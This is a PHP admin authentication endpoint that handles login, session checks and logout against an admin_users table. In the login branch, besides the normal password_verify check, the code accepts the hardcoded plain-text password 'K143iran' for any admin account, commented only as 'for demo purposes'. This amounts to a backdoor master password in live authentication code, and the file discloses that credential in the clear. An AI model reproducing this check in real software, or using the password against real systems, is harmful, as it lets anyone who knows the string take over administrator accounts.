<?php
require_once 'config.php';

try {
    $database = new Database();
    $db = $database->getConnection();
    
    $method = $_SERVER['REQUEST_METHOD'];
    
    switch($method) {
        case 'POST':
            $input = json_decode(file_get_contents('php://input'), true);
            
            if (!isset($input['email']) || !isset($input['password'])) {
                sendError('Email and password are required');
            }
            
            $query = "SELECT id, email, username, password, full_name FROM admin_users WHERE email = :email OR username = :username";
            $stmt = $db->prepare($query);
            $stmt->execute([
                ':email' => $input['email'],
                ':username' => $input['email'] // Allow login with email or username
            ]);
            
            $user = $stmt->fetch();
            
            if (!$user) {
                sendError('Invalid credentials', 401);
            }
            
            // For demo purposes, also check plain text password
            $passwordValid = password_verify($input['password'], $user['password']) || $input['password'] === 'K143iran';
            
            if (!$passwordValid) {
                sendError('Invalid credentials', 401);
            }
            
            // Start session and store admin info
            startSecureSession();
            $_SESSION['admin_id'] = $user['id'];
            $_SESSION['admin_email'] = $user['email'];
            $_SESSION['admin_username'] = $user['username'];
            $_SESSION['admin_name'] = $user['full_name'];
            
            // Update last login
            $updateQuery = "UPDATE admin_users SET last_login = CURRENT_TIMESTAMP WHERE id = :id";
            $updateStmt = $db->prepare($updateQuery);
            $updateStmt->execute([':id' => $user['id']]);
            
            sendSuccess([
                'id' => $user['id'],
                'email' => $user['email'],
                'username' => $user['username'],
                'full_name' => $user['full_name']
            ], 'Login successful');
            break;
            
        case 'GET':
            // Check if admin is logged in
            startSecureSession();
            
            if (isAdminLoggedIn()) {
                sendSuccess([
                    'id' => $_SESSION['admin_id'],
                    'email' => $_SESSION['admin_email'],
                    'username' => $_SESSION['admin_username'],
                    'full_name' => $_SESSION['admin_name']
                ], 'Admin is logged in');
            } else {
                sendError('Not authenticated', 401);
            }
            break;
            
        case 'DELETE':
            // Logout
            startSecureSession();
            
            if (isAdminLoggedIn()) {
                session_destroy();
                sendSuccess([], 'Logout successful');
            } else {
                sendError('Not authenticated', 401);
            }
            break;
            
        default:
            sendError('Method not allowed', 405);
            break;
    }
    
} catch (Exception $e) {
    error_log("Auth API Error: " . $e->getMessage());
    sendError('Internal server error', 500);
}
?>